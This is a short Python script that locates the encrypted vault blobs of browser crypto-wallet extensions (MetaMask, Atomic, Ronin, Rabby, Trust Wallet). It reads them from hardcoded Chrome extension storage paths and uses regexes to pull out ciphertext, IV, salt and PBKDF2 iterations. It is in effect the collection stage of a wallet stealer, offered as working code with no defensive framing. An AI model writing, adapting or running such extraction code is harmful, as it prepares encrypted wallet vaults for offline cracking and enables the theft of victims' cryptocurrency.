import re
import json

def findEncryptedData(path):
    with open(path, "r", encoding="utf-8", errors='ignore') as f: file = f.read()
    regex = [
        r'{\\\"data\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"salt\\\":\\\"(.+?)\\\"}',
        r'{\\\"encrypted\\\":\\\"(.+?)\\\",\\\"nonce\\\":\\\"(.+?)\\\",\\\"kdf\\\":\\\"pbkdf2\\\",\\\"salt\\\":\\\"(.+?)\\\",\\\"iterations\\\":10000,\\\"digest\\\":\\\"sha256\\\"}', 
        r'{\\\"ct\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"s\\\":\\\"(.+?)\\\"}',
        r'{\\\"data\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"keyMetadata\\\":{\\\"algorithm\\\":\\\"PBKDF2\\\",\\\"params\\\":{\\\"iterations\\\":(.+?)}},\\\"salt\\\":\\\"(.+?)\\\"}']
    
    for i, r in enumerate(regex):
        matches = re.search(r, file, re.MULTILINE)
        if matches:
            iterations = 10000
            data = matches.group(1)
            iv = matches.group(2)
            salt = matches.group(3)
            if len(matches.group(3)) < 7:
                iterations = int(matches.group(3))
                salt = matches.group(4)
            vault = {"data": data, "iv": iv, "salt": salt, "iterations": iterations, "type": i}
            return {"status":True, "data": vault}
    
    return {"status":False, "data": []}

def search_cydata(path):
    with open(path, "r", encoding="utf-8", errors='ignore') as f: file = f.read()
    regex = [
        r'{\\\"data\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"salt\\\":\\\"(.+?)\\\"}',
        r'{\\\"encrypted\\\":\\\"(.+?)\\\",\\\"nonce\\\":\\\"(.+?)\\\",\\\"kdf\\\":\\\"pbkdf2\\\",\\\"salt\\\":\\\"(.+?)\\\",\\\"iterations\\\":10000,\\\"digest\\\":\\\"sha256\\\"}', 
        r'{\\\"ct\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"s\\\":\\\"(.+?)\\\"}',
        r'{\\\"data\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"keyMetadata\\\":{\\\"algorithm\\\":\\\"PBKDF2\\\",\\\"params\\\":{\\\"iterations\\\":(.+?)}},\\\"salt\\\":\\\"(.+?)\\\"}']
    output = []
    
    for i, r in enumerate(regex):
        matches = re.findall(r, file, re.MULTILINE)
        if matches:
            for match in matches:
                iterations = 10000
                data = match[0]
                iv = match[1]
                salt = match[2]
                if len(match[2]) < 7:
                    iterations = int(match[2])
                    salt = match[3]
                vault = {"data": data, "iv": iv, "salt": salt, "iterations": iterations, "type": i}
                output.append(vault)

    if output:
        # Удаление дубликатов
        unique_data = list({json.dumps(obj, sort_keys=True) for obj in output})
        
        # Обратно в словари
        unique_data = [json.loads(item) for item in unique_data]
        return {"status":True, "output": unique_data}
    else:
        return {"status":False, "output": []}

metamask = r"C:\Users\root\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn\018124.log"
atomic = r"C:\Users\root\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\gjnckgkfmgmibbkoficdidcljeaaaheg\000005.ldb"
ronin = r"C:\Users\root\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\fnjhmkhhmkbjkkabndcnnogagogbneec\000003.log"
rabby = r"C:\Users\root\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\acmacodkjbdgmoleebolmdjonilkdbch\000003.log"
trustw = r"C:\Users\root\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\egjidjbpglichdcondbcbdnbeeppgdph\000051.log"


print(search_cydata(metamask))

